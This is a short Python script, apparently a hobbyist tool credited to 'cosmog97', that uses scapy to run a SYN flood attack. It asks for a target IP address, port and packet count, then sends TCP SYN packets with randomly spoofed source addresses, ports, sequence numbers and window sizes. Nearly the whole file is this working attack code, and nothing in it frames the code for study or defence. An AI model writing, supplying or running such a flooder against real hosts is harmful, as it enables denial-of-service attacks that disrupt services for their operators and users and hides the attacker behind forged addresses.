  #!/usr/bin/python

from scapy.all import *
import os
import sys
import random

dstIP = dstPort = ""

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort,counter):

	print ("> Packets are sending ...")
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		print("> Packet No. "+str(x)+" sent")
	sys.stdout.write("> Total packets sent: %i\n" % counter)

if __name__ == "__main__":
                print("_______________________________")
                print("# cosmog97 | SYN Flood Attack #")
                print("###############################\n")
                if len(sys.argv) > 1:
                        dstIP = sys.argv[1]
                        dstPort = int (sys.argv[2])
                else:
                        dstIP =  input("> Target IP: ")
                        dstPort = int(input ("> Target Port: "))
                counter = input ("> No. of packets to send: ")
                SYN_Flood(dstIP,dstPort,int(counter))
